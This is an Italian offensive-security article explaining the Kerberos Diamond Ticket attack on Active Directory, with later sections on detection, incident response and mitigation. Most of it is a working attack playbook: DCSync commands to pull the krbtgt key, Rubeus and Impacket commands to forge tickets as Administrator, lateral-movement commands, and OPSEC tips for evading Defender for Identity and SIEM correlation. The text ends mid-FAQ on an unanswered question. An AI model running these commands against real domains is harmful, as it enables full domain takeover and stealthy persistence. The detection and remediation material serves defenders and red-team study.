---
title: 'Diamond Ticket Attack: L''Evoluzione Stealth del Golden Ticket'
slug: diamond-ticket
description: 'Diamond Ticket: variante stealth del Golden Ticket con TGT reale per bypassare MDI. Guida Rubeus /ldap /opsec, Impacket, detection e reset krbtgt.'
image: /diamond-ticket-ad-persistence-attack-kerberos.webp
draft: true
date: 2026-07-07T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - active-directory
  - kerberos
  - ticket-windows
  - diamond-ticket
---

# Diamond Ticket Attack: L'Evoluzione Stealth del Golden Ticket

> Il Diamond Ticket è la versione stealth del Golden Ticket: invece di creare un ticket falso da zero, parte da un ticket vero, lo modifica per ottenere privilegi da amministratore, e lo re-inietta. Nei log sembra tutto normale — l'unica soluzione è il doppio reset di krbtgt.

***

## Glossario rapido

Per il protocollo Kerberos completo vedi [Kerberos — autenticazione in Active Directory](https://hackita.it/articoli/kerberos/).

* **PAC (Privilege Attribute Certificate)**: Struttura nel TGT che lista i gruppi dell'utente. Il KDC la costruisce al momento dell'AS-REQ. Il Diamond Ticket la sostituisce con una versione manipolata, mantenendo tutto il resto del ticket originale.
* **KDC Signature**: Firma crittografica del PAC con la chiave del KDC (krbtgt). Garantisce l'integrità del PAC. Il Diamond Ticket deve ri-firmare il PAC con la stessa chiave dopo averlo modificato.
* **/tgtdeleg**: Flag Rubeus che coerces il client Kerberos a eseguire un GSS-API dance e ottenere un TGT delegabile dalla sessione corrente — senza conoscere la password dell'utente, basta essere nella loro sessione.
* **KDCOptions**: Flags nella richiesta Kerberos che descrivono le opzioni del ticket (forwardable, renewable, ecc.). Tool come Rubeus con `/opsec` le allineano al comportamento nativo Windows per evitare fingerprinting.

***

## Kerberos internals: perché il Diamond Ticket è più stealth del Golden

**Flusso Golden Ticket — completamente offline:**

```
Attaccante ──[forgia TGT da zero con hash krbtgt]──────────────► TGT falso
                                                                      │
                    KDC non viene mai contattato                      │
                    Nessun AS-REQ nei log → anomalia rilevabile        │
                                                                      ▼
Attaccante ──TGT falso──► KDC ──TGS-REP──► Servizio ──► Accesso concesso
```

**Flusso Diamond Ticket — TGT reale, PAC modificato:**

```
Attaccante ──AS-REQ (utente reale)──► KDC ──AS-REP (TGT legittimo)──► Attaccante
                                                                            │
                         4768 nel log — tutto normale                       │
                                                                            │
Attaccante ──[decripta TGT con krbtgt key]──► modifica PAC (aggiunge DA)   │
Attaccante ──[re-cifra TGT con stessa krbtgt key]──► TGT modificato        │
                                                                            ▼
Attaccante ──TGT modificato──► KDC ──TGS-REP──► Servizio ──► Accesso come DA
```

**La differenza critica:** Il Golden Ticket non ha AS-REQ — i sistemi di detection come MDI cercano 4624 senza 4768 corrispondente. Il Diamond Ticket ha un AS-REQ reale. Quello che manca è la coerenza tra il PAC emesso dal KDC e il PAC presentato nella richiesta successiva — ma questa discrepanza è molto più difficile da rilevare.

> **Aggiornamento 2025 — Rubeus /ldap /opsec:** La ricerca Huntress (2025) ha modernizzato il comando `diamond` in Rubeus aggiungendo `/ldap` (che interroga LDAP per costruire un PAC con attributi reali dall'AD) e `/opsec` (che allinea il flusso AS-REQ/AS-REP al comportamento nativo Windows). Questo riduce ulteriormente gli indicatori di compromissione, come il mismatch nei campi PAC o nei KDCOptions.

***

## Introduzione

Il Diamond Ticket è classificato **[T1558.001](https://attack.mitre.org/techniques/T1558/001/) (MITRE ATT\&CK)** — stessa categoria del Golden Ticket, in quanto variante stealth dello stesso vettore. Richiede comunque l'hash di krbtgt, ma il meccanismo è fondamentalmente diverso.

Nato come risposta diretta ai sistemi di detection che rilevano l'assenza di AS-REQ tipica del Golden Ticket, è la tecnica di scelta in ambienti con Microsoft Defender for Identity attivo, Sentinel, o qualsiasi sistema di correlazione comportamentale Kerberos.

**Dove si posiziona rispetto alle altre tecniche:**

| Tecnica                                                         | Cosa usi                         | AS-REQ nei log | PAC autentico      | Richiede DA? | Contatta DC? |
| --------------------------------------------------------------- | -------------------------------- | -------------- | ------------------ | ------------ | ------------ |
| [Silver Ticket](https://hackita.it/articoli/silver-ticket/)     | Hash service account             | No             | No                 | No           | No           |
| [Golden Ticket](https://hackita.it/articoli/golden-ticket/)     | krbtgt hash                      | No             | No                 | Sì           | No           |
| **Diamond Ticket**                                              | krbtgt hash + TGT reale          | **Sì**         | **Parzialmente**   | Sì           | **Sì**       |
| [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/) | krbtgt hash + PAC reale S4U2Self | Sì             | **Sì (autentico)** | Sì           | Sì           |

Il Diamond Ticket colma il gap di detection principale del Golden Ticket. Il Sapphire Ticket va ancora oltre — ma richiede un'interazione più complessa col KDC.

***

## Diamond vs Golden: il confronto chiave

Questa è la sezione che devi capire prima di scegliere quale usare.

|                           | Golden Ticket                 | Diamond Ticket                   |
| ------------------------- | ----------------------------- | -------------------------------- |
| TGT di partenza           | Forgiato offline da zero      | Reale, emesso dal KDC            |
| AS-REQ nei log            | ❌ Assente (anomalia)          | ✅ Presente (legittimo)           |
| PAC                       | Completamente inventato       | Parzialmente reale (modificato)  |
| KDCOptions nel ticket     | Spesso anomali (tool default) | Allineati a Windows (con /opsec) |
| Richiede contatto col DC  | No                            | Sì (per l'AS-REQ iniziale)       |
| Offline completo          | Sì                            | No                               |
| Difficoltà di rilevazione | Alta                          | Molto alta                       |
| Tool principale           | Mimikatz, Rubeus, Impacket    | Rubeus, Impacket                 |
| Remediation               | Doppio reset krbtgt           | Doppio reset krbtgt              |

**Quando scegliere Diamond invece di Golden:**

* L'ambiente ha **MDI o un SIEM** che correla assenza di AS-REQ con logon Kerberos → Golden Ticket è rilevabile, Diamond no.
* Vuoi **KDCOptions** che non siano anomali → `/opsec` li allinea al comportamento Windows.
* Hai bisogno che il **PAC abbia attributi reali** dell'utente (group count, SID history, ecc.) → `/ldap` li estrae direttamente dall'AD.

**Quando Golden è sufficiente:**

* Ambiente senza monitoring avanzato.
* Hai bisogno di essere completamente offline (no comunicazione col DC).
* Velocità prioritaria su stealth.

***

## Come funziona in dettaglio

1. **Richiedi un TGT reale** per qualsiasi utente con credenziali valide (basta un account low-privilege) tramite AS-REQ. Il KDC lo emette normalmente e genera evento 4768.
2. **Decripta il TGT** con la chiave krbtgt (AES256 o NTLM) — stesso hash necessario per il Golden Ticket.
3. **Modifica il PAC**: cambia l'utente impersonato, aggiungi gruppi privilegiati (Domain Admins: RID 512, Enterprise Admins: RID 519).
4. **Re-firma il PAC** con la stessa chiave krbtgt — il KDC Signature e il Server Signature vengono ricalcolati.
5. **Re-cifra il TGT** con la chiave krbtgt.
6. **Inietta in memoria** il TGT modificato.

Il KDC che riceve i successivi TGS-REQ vede un TGT crittograficamente valido, con un AS-REQ che esiste nei log. La discrepanza PAC non viene rilevata senza PAC validation esplicita.

***

## Prerequisiti

* Hash krbtgt **AES256** (preferito) o NTLM
* Domain SID
* FQDN del dominio e IP del DC
* Credenziali di un qualsiasi account di dominio (anche low-privilege) — per l'AS-REQ iniziale
* **Alternativa senza credenziali:** Essere già in una sessione Windows autenticata (per `/tgtdeleg`)

```powershell
# Recupera Domain SID
impacket-lookupsid corp.local/user:Password123@DC_IP 0

# === ESTRAI krbtgt AES256 KEY (richiede DA o diritti DCSync) ===

# Mimikatz — DCSync per krbtgt
lsadump::dcsync /domain:corp.local /user:krbtgt
# Output rilevante:
# * AES256 HMAC Key: <64 char hex — questa è la chiave da usare con /krbkey>
# * AES128 HMAC Key: <32 char hex>
# * rc4_hmac_nt   : <32 char hex — hash NTLM>

# Impacket da Linux
impacket-secretsdump corp.local/Administrator:pass@DC_IP -just-dc-user krbtgt
# Output:
# krbtgt:aes256-cts-hmac-sha1-96:<64 char hex>  ← /krbkey
# krbtgt:aes128-cts-hmac-sha1-96:<32 char hex>
# krbtgt:502:aad3b435...:<ntlm hash>:::          ← /rc4 (meno stealth)
```

> **NTLM ≠ AES256:** Non esiste conversione diretta da hash NTLM a chiave AES. Sono derivati separati dalla stessa password ma con algoritmi diversi. Se hai solo il NTLM hash, puoi forgiare con `/rc4` (meno stealth, RC4 è anomalo nei domini moderni) — oppure fai DCSync e prendi direttamente la chiave AES.**Multi-DC:** Il TGT emesso da un DC è valido su **tutti** i DC del dominio — non sei vincolato a quel DC specifico. Attenzione però al clock skew in foreste con DC geograficamente distribuiti: se un DC ha più di 5 minuti di differenza dall'orologio del sistema che inietta il ticket, il ticket viene rifiutato da quel DC specifico. Verifica sempre la sincronizzazione NTP prima di lanciare.

***

## Step 1 — Ottenere il TGT legittimo

Prima di modificare il PAC, hai bisogno di un TGT reale come "base". Hai tre opzioni.

### Opzione A — `/tgtdeleg` (nessuna credenziale aggiuntiva)

`/tgtdeleg` è un flag [Rubeus](https://hackita.it/articoli/rubeus/) che sfrutta il meccanismo di delega Kerberos GSS-API per estrarre un TGT delegabile dalla sessione corrente — senza conoscere la password dell'utente. Richiede di essere già in una sessione Windows autenticata.

```powershell
# Estrai TGT dalla sessione corrente via tgtdeleg
Rubeus.exe tgtdeleg /nowrap
# Output: base64-encoded TGT → copialo per usarlo nel Diamond Ticket
```

### Opzione B — AS-REQ con credenziali

```powershell
# Richiedi TGT con credenziali (anche low-privilege)
Rubeus.exe asktgt /user:utente_low /password:Password123 /domain:corp.local /dc:DC01.corp.local /nowrap
# → TGT in base64
```

```bash
# Da Linux con Impacket
impacket-getTGT corp.local/utente_low:Password123 -dc-ip DC_IP
export KRB5CCNAME=utente_low.ccache
```

### Opzione C — Export da LSASS

Se sei su un host Windows con ticket in cache:

```powershell
# Mimikatz — dump tutti i ticket in memoria
sekurlsa::tickets /export
# Produce file .kirbi → usalo come base per il Diamond Ticket
```

***

## Step 2 — Forgiare il Diamond Ticket

### Con Rubeus — metodo base

[Rubeus](https://hackita.it/articoli/rubeus/) usa il subcommand `diamond`. Il parametro chiave è `/krbkey` (chiave krbtgt AES256) — diverso da `/aes256` usato per `golden` e `silver`.

```powershell
# Diamond Ticket con credenziali utente (Rubeus fa tutto: AS-REQ + patch PAC)
Rubeus.exe diamond \
  /krbkey:KRBTGT_AES256_KEY \
  /user:utente_low \
  /password:Password123 \
  /dc:DC01.corp.local \
  /enctype:aes \
  /domain:corp.local \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519,520,513,518 \
  /ptt /nowrap

# Diamond Ticket con /tgtdeleg (nessuna password)
Rubeus.exe diamond \
  /krbkey:KRBTGT_AES256_KEY \
  /tgtdeleg \
  /enctype:aes \
  /domain:corp.local \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519 \
  /ptt /nowrap

# Diamond Ticket da TGT già ottenuto (base64)
Rubeus.exe diamond \
  /krbkey:KRBTGT_AES256_KEY \
  /ticket:BASE64_TGT_QUI \
  /enctype:aes \
  /domain:corp.local \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519 \
  /ptt /nowrap
```

### Con Rubeus — modalità stealth avanzata `/ldap` `/opsec`

Questa è la versione più stealth (aggiornamento Huntress 2025):

```powershell
# /ldap → interroga LDAP per costruire il PAC con attributi reali dell'utente
# /opsec → allinea AS-REQ/AS-REP al comportamento Windows nativo (AES-only, KDCOptions corretti)
Rubeus.exe diamond \
  /krbkey:KRBTGT_AES256_KEY \
  /user:utente_low \
  /password:Password123 \
  /dc:DC01.corp.local \
  /enctype:aes \
  /domain:corp.local \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519 \
  /ldap /opsec \
  /ptt /nowrap
```

> **Cosa fa `/ldap` — attributi estratti:**
> Interroga AD via LDAP e monta SYSVOL per costruire un PAC con dati reali. Gli attributi che legge:
> `cn`, `objectSid`, `userAccountControl`, `primaryGroupId`, `sAMAccountName`, `memberOf`, `lastLogonTimestamp`, `accountExpires`, `profilePath`, `homeDirectory` — più la Kerberos policy dal file `GptTmpl.inf` in SYSVOL (ticket lifetime, max renewal, ecc.). Il PAC risultante ha tutti i campi che Windows popola normalmente, rendendo il mismatch con uno emesso dal KDC quasi impossibile da rilevare.

**Cosa fa `/opsec` — KDCOptions corretti:**

Senza `/opsec`, Rubeus usa KDCOptions di default del tool (forwardable + renewable + altri flag in combinazioni non native). `/opsec` corregge:

* Forza **AES-only** nella preauth (no downgrade RC4)
* Corregge i flag `forwardable`, `renewable`, `proxiable` per matchare il client Windows nativo
* Esegue il **two-step preauth exchange** (PA-ENC-TIMESTAMP prima, poi AS-REQ completo) come farebbe Windows
* Elimina i fingerprint di tool che i SIEM e Huntress hanno documentato come rilevabili

### Con Impacket da Linux

**ticketer.py** con il flag `-request` esegue prima un AS-REQ reale, poi modifica il PAC — questo è l'approccio Diamond da Linux:

```bash
# Diamond approach con ticketer.py (-request = ottieni TGT reale prima di modificarlo)
python3 ticketer.py \
  -aesKey KRBTGT_AES256_KEY \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  -user utente_low \
  -password Password123 \
  -request \
  -dc-ip DC_IP \
  -user-id 500 \
  -groups 512,519 \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```

> **Differenza vs Golden:** Senza `-request`, ticketer.py forgia il TGT offline (Golden approach). Con `-request`, fa prima un AS-REQ reale e modifica il PAC del TGT ricevuto (Diamond approach).

### Diamond Ticket su TGS (variante Silver stealth)

Rubeus permette di applicare la tecnica Diamond anche ai TGS — un Silver Ticket con TGT reale come base:

```powershell
# Diamond-style Silver Ticket: più stealth del Silver classico
Rubeus.exe diamond \
  /ticket:BASE64_TGT \
  /service:cifs/DC01.corp.local \
  /servicekey:AES256_SERVICE_KEY \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /ldap /opsec /nowrap
```

> **Ibrido Diamond+Silver — la variante più stealth in assoluto:** Questo non è né un Silver Ticket classico né un Diamond Ticket puro. È la combinazione: TGT reale (AS-REQ nel log), TGS con PAC autentico (da `/ldap`), senza emettere TGS-REQ al KDC. Il risultato è un service ticket che appare completamente legittimo nei log — ha l'AS-REQ, ha il PAC reale dell'utente, ma i privilegi sono stati elevati. Nessun TGS-REQ aggiuntivo al KDC. È la scelta quando vuoi accedere a un singolo servizio con il massimo di stealth possibile.

### Conversione .kirbi ↔ .ccache

```bash
impacket-ticketConverter diamond.kirbi diamond.ccache
impacket-ticketConverter diamond.ccache diamond.kirbi
```

***

## Step 3 — Lateral Movement e verifica

```powershell
# Verifica ticket in cache (Windows)
klist
# Server: krbtgt/CORP.LOCAL @ CORP.LOCAL — con client: Administrator @ CORP.LOCAL

# Accesso immediato
dir \\DC01\C$
```

```bash
# Linux
klist
export KRB5CCNAME=Administrator.ccache

# Exec remoto
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
impacket-wmiexec -k -no-pass corp.local/Administrator@TARGET
impacket-smbexec -k -no-pass corp.local/Administrator@TARGET
```

Per lateral movement sistematico su subnet intere, [NetExec](https://hackita.it/articoli/netexec/):

```bash
netexec smb 192.168.1.0/24 --use-kcache -x 'whoami'
netexec smb 192.168.1.0/24 --use-kcache --sam
```

***

## OPSEC offensiva

**Usa sempre AES256, mai RC4**
Con `/krbkey` (AES) invece di `/rc4`, il ticket usa AES256 — tipo di encryption nativo Windows. RC4 è anomalo nei domini moderni e trigger immediato per MDI.

**`/opsec` obbligatorio in ambienti monitorati**
Senza `/opsec`, Rubeus genera KDCOptions con valori di default del tool — rilevabili per fingerprinting. Con `/opsec` il flusso è indistinguibile da un client Windows legittimo.

**`/ldap` per PAC con attributi reali**
Senza `/ldap`, il PAC ha solo i gruppi che specifichi — ma mancano attributi come `LastLogon`, `AccountExpires`, `ProfilePath` che Windows popola normalmente. MDI può rilevare PAC "vuoti" su questi campi. Con `/ldap` li prende dall'AD direttamente.

**Usa `/tgtdeleg` quando possibile**
Evita di usare credenziali in chiaro nel comando (rischio di logging). `/tgtdeleg` usa la sessione corrente senza esporre password.

**Durata realistica**
Rubeus diamond allinea già la durata al ticket base — ma verifica con `klist` che il tempo di scadenza sia coerente col dominio (default 10 ore TGT, 7 giorni rinnovo).

**Processo isolato**

```powershell
# Crea processo separato con il ticket (evita contaminazione sessione)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
# Prendi il LUID → inietta il diamond ticket nel nuovo LUID
```

***

## Limiti ed errori comuni

* **Chiave AES invece di NTLM**: Il flag Rubeus è `/krbkey`, non `/aes256` (che è per `golden`/`silver`). Errore comune.
* **Credenziali utente non valide**: Il Diamond Ticket richiede un AS-REQ reale — se le credenziali dell'utente base sono sbagliate o scadute, l'AS-REQ fallisce e il Diamond Ticket non può essere creato. Hai bisogno di almeno un account valido.
* **`/tgtdeleg` fuori sessione**: `/tgtdeleg` funziona solo in una sessione Windows autenticata. Da Linux o senza sessione, usa credenziali esplicite.
* **KDC irraggiungibile**: A differenza del Golden Ticket, il Diamond richiede comunicazione col KDC per l'AS-REQ. Se il DC non è raggiungibile, usa Golden Ticket.
* **PAC validation attiva**: Se il servizio target valida il PAC contro il DC, anche il Diamond Ticket viene rilevato (il PAC modificato non corrisponde a quello originale emesso dal KDC). Molto raro di default.
* **Clock Skew**: Stessa tolleranza del Golden Ticket — 5 minuti. Orologi sfasati = ticket rifiutato.

***

## Scenario reale

Un red teamer in un assessment enterprise scopre che MDI è attivo e configurato per rilevare Golden Ticket (alert su 4624 senza 4768 corrispondente). Il Golden Ticket classico verrebbe rilevato in meno di 5 minuti.

Ha già l'hash AES256 di krbtgt (da DCSync su un DC secondario) e un account low-privilege di dominio.

1. Esegue `Rubeus.exe diamond /krbkey:HASH /user:helpdesk /password:Welcome1 /dc:DC01.corp.local /enctype:aes /domain:corp.local /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /ldap /opsec /ptt /nowrap`

> **OPSEC su DCSync:** Prima di eseguire DCSync per l'hash krbtgt, valuta se il comando è tracciato. In ambienti con MDI attivo, un DCSync da un IP non autorizzato è un alert immediato (Event ID 4662 + 4742). Per ridurre il rischio: esegui DCSync da un account che ha già legittimamente diritti di replica, da un DC secondario compromesso, o da un processo già presente nel dominio. Non eseguire DCSync e Diamond Ticket dalla stessa macchina nello stesso timeframe — la correlazione è triviale per un analista.

1. MDI vede: AS-REQ legittimo per l'account helpdesk → nessun alert.
2. Il TGS-REQ successivo appare come "helpdesk/Administrator richiedono un ticket per CIFS" → comportamento anomalo ma non bloccante senza regole specifiche.
3. Accesso a `\\DC01\C$` — persistenza completata.
4. L'unica cosa che avrebbe fermato l'attacco: PAC validation sui servizi critici o MDI configurato per alert su PAC mismatch.

***

## Detection

Rilevare un Diamond Ticket è significativamente più difficile di un Golden Ticket.

**🔴 HIGH — Segnali critici:**

* **PAC mismatch**: Se hai un sistema che confronta il PAC emesso durante l'AS-REP con il PAC presentato nelle successive TGS-REQ (Microsoft ATA/MDI fa questo), la discrepanza è rilevabile.
* **Event ID 4768** (AS-REQ) + **Event ID 4769** (TGS-REQ) con account in gruppi ad alto privilegio (Domain Admins) che non corrispondono alla membership reale nell'AD — correlazione SIEM.
* **KDCOptions anomali**: Senza `/opsec`, i KDCOptions nei ticket Rubeus hanno pattern riconoscibili. Huntress ha documentato che i ticket Diamond senza `/opsec` hanno options anomale nei log.

**🟡 MEDIUM — Segnali secondari:**

* **Event ID 4624 Type 3** su host critici (DC, file server) con account che hanno storia di accesso insolita.
* AS-REQ per un utente low-privilege immediatamente seguito da TGS-REQ per risorse ad alta sensibilità — sequenza temporale sospetta.
* Ticket con encryption type AES256 ma proveniente da macchine che storicamente usano RC4 (mismatch rispetto al baseline comportamentale).
* Processi Rubeus o tool correlati nel log Sysmon (Event ID 1, 10 per accesso a LSASS).

**Microsoft Defender for Identity:**
MDI ha detection specifica per Diamond Ticket (alert "Suspected Golden Ticket usage — PAC anomaly") basata sulla discrepanza tra il PAC nell'AS-REP e quello nelle richieste successive. È il metodo più affidabile.

**SIEM correlation rule (KQL — Sentinel):**

```kql
// Diamond/Golden Ticket: TGS con gruppi non corrispondenti alla membership AD
SecurityEvent
| where EventID == 4769
| where TicketOptions !has "0x40810010"  // KDCOptions anomali (senza /opsec)
| join kind=inner (
    // Confronta i SID dei gruppi nel ticket con l'effettiva membership AD
    IdentityInfo
    | project AccountName, GroupMembership
) on $left.TargetUserName == $right.AccountName
| where not(GroupMembership has "Domain Admins") 
    and TicketEncryptionType in ("0x12", "0x11")  // AES — alta priorità
| project TimeGenerated, TargetUserName, ServiceName, ClientIPAddress, TicketOptions
```

> **Ambienti ibridi:** `SecurityEvent` copre solo gli host on-prem. Per ambienti con Azure AD Connect o ADFS, aggiungi correlazione su `IdentityLogonEvents` (Microsoft 365 Defender) o `AADNonInteractiveUserSignInLogs` (Azure AD) per rilevare eventuali pivot verso il cloud successivi al Diamond Ticket on-prem.

***

## Incident Response

Il Diamond Ticket usa la stessa chiave del Golden Ticket → **stessa remediation**.

1. **Identifica la fonte dell'AS-REQ** — Event ID 4768 con il timestamp del ticket compromesso. Risali all'IP e all'account usato.
2. **Non aspettare**: Ogni minuto che passa l'attaccante può forgiare nuovi ticket o muoversi lateralmente.
3. **Doppio reset di krbtgt** — metodo corretto:

```powershell
# Metodo raccomandato
Set-ADAccountPassword -Identity krbtgt -Reset \
  -NewPassword (ConvertTo-SecureString "NuovaPwd1!" -AsPlainText -Force)
# → attendi 10-12 ore per sincronizzazione multi-DC
Set-ADAccountPassword -Identity krbtgt -Reset \
  -NewPassword (ConvertTo-SecureString "NuovaPwd2!" -AsPlainText -Force)

# Script ufficiale Microsoft — gestisce la sincronizzazione automaticamente
# https://github.com/microsoft/New-KrbtgtKeys.ps1
.\New-KrbtgtKeys.ps1 -DomainFQDN corp.local -ResetType Twice
```

> `klist purge` non invalida i Diamond Ticket. Solo il reset di krbtgt li invalida.

1. **Revoca l'account usato per l'AS-REQ**: Se l'attaccante ha usato un account low-privilege per il Diamond Ticket, resetta o disabilita quell'account.
2. **Hunting sulle persistenze**: Cerca scheduled task, WMI subscription, account backdoor con SIDHistory anomala sui DC — l'attaccante potrebbe aver installato persistenze durante la finestra di accesso.
3. **Review ACL e trust**: Verifica deleghe modificate o trust malevole.
4. **Abilita PAC validation** sui servizi critici post-incident.

***

## Ambienti ibridi: Diamond Ticket e Azure AD

Il Diamond Ticket è una tecnica **esclusivamente on-premise** — non dà accesso diretto a risorse cloud native (SharePoint Online, Exchange Online, Azure VMs Azure-joined). Queste usano token OAuth2/OIDC via Azure AD, non Kerberos on-prem.

**Cosa funziona e cosa no:**

| Risorsa                     | Diamond Ticket funziona? | Perché                              |
| --------------------------- | ------------------------ | ----------------------------------- |
| DC on-prem                  | ✅ Sì                     | Kerberos on-prem                    |
| File server on-prem         | ✅ Sì                     | CIFS Kerberos on-prem               |
| Exchange on-prem            | ✅ Sì                     | HTTP Kerberos on-prem               |
| SharePoint Online / M365    | ❌ No                     | OAuth2/Azure AD                     |
| Exchange Online             | ❌ No                     | OAuth2/Azure AD                     |
| Azure VM (Azure-joined)     | ❌ No                     | Azure AD auth                       |
| VM on-prem (domain-joined)  | ✅ Sì                     | Kerberos on-prem                    |
| **Azure AD Connect server** | ⚠️ Sì, ma critico        | On-prem — è il ponte verso Azure AD |
| **AD FS server**            | ⚠️ Sì, ma critico        | On-prem — emette token per il cloud |

**Il punto critico — Azure AD Connect e AD FS:**

Il Diamond Ticket non raggiunge il cloud direttamente. Ma se usi il Diamond Ticket per compromettere il server Azure AD Connect o il server AD FS, puoi:

* Estrarre le credenziali del service account `MSOL_XXXXXXXXXX` (Azure AD Connect) → accesso al tenant Azure AD con privilegi di sincronizzazione
* Pivotare dal AD FS verso token SAML per risorse cloud
* Compromettere la sincronizzazione on-prem → cloud in modo persistente

> Il Diamond Ticket non è la fine del path — è il mezzo. In ambienti ibridi, il Diamond Ticket on-prem può essere il ponte per la compromissione del tenant Azure AD se i server ibridi non sono protetti.

***

## Mitigazione e prevenzione

* **Proteggi l'hash krbtgt** come asset primario — vedi [Golden Ticket](https://hackita.it/articoli/golden-ticket/) per il path completo verso krbtgt.
* **Doppio reset krbtgt periodico (almeno semestrale)**: Riduce la finestra di utilizzo. Usa [New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1).
* **Microsoft Defender for Identity**: È lo strumento più efficace per rilevare Diamond Ticket tramite PAC anomaly detection. Configuralo e verifica che gli alert siano attivi per T1558.001.
* **AES-only enforcement** (`msDS-SupportedEncryptionTypes = 24`): Non previene il Diamond ma forza l'uso di AES — aumenta il costo dell'attacco e riduce i vettori di downgrade.
* **PAC validation** sui servizi critici: Forza i servizi a contattare il DC per validare il PAC → Diamond Ticket rilevato anche senza MDI.
* **Monitora [DCSync](https://hackita.it/articoli/dcsync/)** in tempo reale (Event ID 4662 con diritti di replica) — l'hash krbtgt arriva tipicamente via DCSync.
* **Mappa i path verso krbtgt con [BloodHound](https://hackita.it/articoli/bloodhound/)** e rimuovi le deleghe non necessarie.
* **Kerberos Armoring (FAST)**: Impatto **limitato** sul Diamond Ticket. FAST cifra il canale AS-REQ/AS-REP tra client e KDC — ma il Diamond Ticket usa un AS-REQ reale (quindi FAST non lo blocca) e il TGT è già cifrato con la chiave krbtgt (che l'attaccante ha). FAST protegge il canale di autenticazione, non la validità del PAC. Vale abilitarlo per mitigare altri vettori Kerberos (AS-REP Roasting, downgrade), ma non risolve il problema Diamond.
* **Monitora KDCOptions anomali** nei log 4768/4769 — pattern di tool come Rubeus senza `/opsec` sono rilevabili.
* **Monitora DCSync con alert immediato** (Event ID 4662): DCSync è il vettore più comune per ottenere l'hash krbtgt. In ambienti con MDI, un DCSync da IP non autorizzato genera alert immediato. Se l'attaccante fa DCSync da un account legittimo con diritti di replica o da un DC secondario compromesso, l'operazione appare normale — pianifica la risposta anche per questo scenario.

***

## Confronto: Silver / Golden / Diamond / Sapphire

|                 | [Silver Ticket](https://hackita.it/articoli/silver-ticket/) | [Golden Ticket](https://hackita.it/articoli/golden-ticket/) | **Diamond Ticket**    | [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/) |
| --------------- | ----------------------------------------------------------- | ----------------------------------------------------------- | --------------------- | --------------------------------------------------------------- |
| Hash richiesto  | Service account                                             | krbtgt                                                      | krbtgt                | krbtgt                                                          |
| TGT di partenza | N/A (forgia TGS)                                            | Forgiato offline                                            | **Reale (da AS-REQ)** | Reale (da AS-REQ)                                               |
| Scope           | Singolo servizio                                            | Intero dominio                                              | Intero dominio        | Intero dominio                                                  |
| Richiede DA?    | No                                                          | Sì                                                          | Sì                    | Sì                                                              |
| Contatta DC?    | No                                                          | No                                                          | **Sì (AS-REQ)**       | Sì (AS-REQ + S4U2Self)                                          |
| AS-REQ nei log  | No                                                          | No                                                          | **Sì**                | Sì                                                              |
| PAC autentico   | No                                                          | No                                                          | **Parzialmente¹**     | **Sì (autentico)**                                              |

¹ *"Parzialmente autentico"*: il PAC Diamond proviene da un AS-REP reale e con `/ldap` ha attributi reali (group count, SID, LastLogon, ecc.). Ma i **gruppi sono stati modificati** (es. aggiunti Domain Admins) — quella parte non è autentica. Il Sapphire Ticket invece usa S4U2Self+U2U per ottenere il TGS con il PAC firmato dal KDC per l'utente target, senza modifiche — completamente autentico.
\| KDCOptions allineati | N/A | No (tool default) | **Sì (con /opsec)** | Sì |
\| Completamente offline | Sì | Sì | No | No |
\| Rilevazione principale | 4624 senza 4769 DC | Assenza AS-REQ | PAC mismatch | Estremamente difficile |
\| Remediation | Reset service account | Doppio reset krbtgt | Doppio reset krbtgt | Doppio reset krbtgt |
\| Stealth | Massima | Alta | **Molto alta** | Altissima |

***

## Quick Reference

**1. Ottieni krbtgt AES256 key via [DCSync](https://hackita.it/articoli/dcsync/):**

```powershell
lsadump::dcsync /domain:corp.local /user:krbtgt
# Cerca: * AES256 HMAC Key
```

**2. Diamond Ticket con Rubeus — versione stealth completa:**

```powershell
Rubeus.exe diamond /krbkey:AES256_KEY /user:utente_low /password:Pass123 /dc:DC01.corp.local /enctype:aes /domain:corp.local /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /ldap /opsec /ptt /nowrap
```

**3. Diamond Ticket con /tgtdeleg (no password):**

```powershell
Rubeus.exe diamond /krbkey:AES256_KEY /tgtdeleg /enctype:aes /domain:corp.local /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /ptt /nowrap
```

**4. Diamond Ticket con Impacket da Linux:**

```bash
python3 ticketer.py -aesKey AES256_KEY -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local -user utente_low -password Pass123 -request -dc-ip DC_IP -user-id 500 -groups 512,519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```

**5. Lateral movement:**

```bash
netexec smb 192.168.1.0/24 --use-kcache -x 'whoami'
```

**6. Remediation — doppio reset krbtgt:**

```powershell
.\New-KrbtgtKeys.ps1 -DomainFQDN corp.local -ResetType Twice
```

***

## FAQ

**Diamond Ticket o Golden Ticket — quale uso?**
Se l'ambiente ha MDI o un SIEM con correlazione AS-REQ, usa Diamond. Se sei offline o vuoi velocità massima senza monitoring avanzato, Golden è sufficiente.

**`/tgtdeleg` funziona sempre?**
Solo in sessioni Windows autenticate con accesso al KDC. Da Linux o in sessioni isolate, usa credenziali esplicite.

**Cosa cambia con `/ldap` e `/opsec`?**
`/ldap` estrae attributi PAC reali dall'AD — riduce il PAC mismatch rilevabile da MDI. `/opsec` allinea i KDCOptions al comportamento Windows nativo — elimina il fingerprinting del tool.

**Il Diamond Ticket bypassa PAC validation?**
No. Se PAC validation è attiva, il servizio contatta il DC per verificare il PAC — la modifica viene rilevata. PAC validation è rara di default ma è la mitigazione più efficace.

**Quanta differenza fa il Diamond rispetto al Golden per il defender?**
